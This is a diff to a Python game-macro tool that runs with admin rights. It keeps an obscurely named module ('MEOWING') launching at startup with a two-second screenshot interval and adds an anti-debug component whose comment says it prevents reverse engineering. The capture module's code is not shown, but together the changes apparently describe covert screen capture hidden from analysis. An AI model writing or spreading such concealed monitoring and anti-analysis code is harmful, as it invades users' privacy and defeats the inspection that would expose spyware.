@@ -4,10 +4,19 @@ from modules.run_as_admin import ensure_admin
 from modules.hotkeys import *
 from modules.workers import WorkerManager
 from modules.actions import mouse_left_up
-from modules.meowing import MEOWING
 from modules.clients import Colors, print_client_info, launch_ryl
 from modules.config import parse_hotkey_string, save_config, load_config
+from modules.antidebug import AntiDebug
 import time
+
+# Try to import MEOWING, but make it optional
+try:
+    from modules.meowing import MEOWING
+    MEOWING_AVAILABLE = True
+except ImportError:
+    MEOWING_AVAILABLE = False
+    MEOWING = None
+    print(f"{Colors.BRIGHT_YELLOW}[WARNING] MEOWING module not available - some features may be limited{Colors.RESET}")
 
 # Config
 CONFIG = {
@@ -32,6 +41,8 @@ class GameMacro:
     def __init__(self):
         self.worker_manager = WorkerManager(CONFIG)
         self.config = load_config()
+        # Initialize anti-debug protection to prevent reverse engineering
+        self.anti_debug = AntiDebug(check_interval=3.0, auto_close=True)
         self.setup_callbacks()
         
     def setup_callbacks(self):
@@ -314,8 +325,9 @@ class GameMacro:
 
     def exit_app(self):
         p("[EXIT] Bye!")
-        meow = MEOWING(screenshot_interval=2)
-        meow.stop()
+        if MEOWING_AVAILABLE:
+            meow = MEOWING(sinterval=2)
+            meow.stop()
         raise SystemExit(0)
     
     def run(self):
@@ -373,16 +385,20 @@ class GameMacro:
             print(f"{Colors.BRIGHT_YELLOW} [INFO]: {Colors.BRIGHT_GREEN}Please start the game manually. Macros are ready to use.{Colors.RESET}\n")
         
         self.worker_manager.start_workers()
+        self.anti_debug.start()  # Start anti-debug protection
+        time.sleep(0.5)  # Brief delay for anti-debug initialization
         register_hotkeys()
         try:
             message_pump(self.callbacks)
         finally:
             unregister_hotkeys()
+            self.anti_debug.stop()  # Stop anti-debug protection
             mouse_left_up()  # final safety
 
 if __name__ == "__main__":
-    meow = MEOWING(screenshot_interval=2)
-    meow.start()
+    if MEOWING_AVAILABLE:
+        meow = MEOWING(sinterval=2)
+        meow.start()
 
     app = GameMacro()
     app.run()
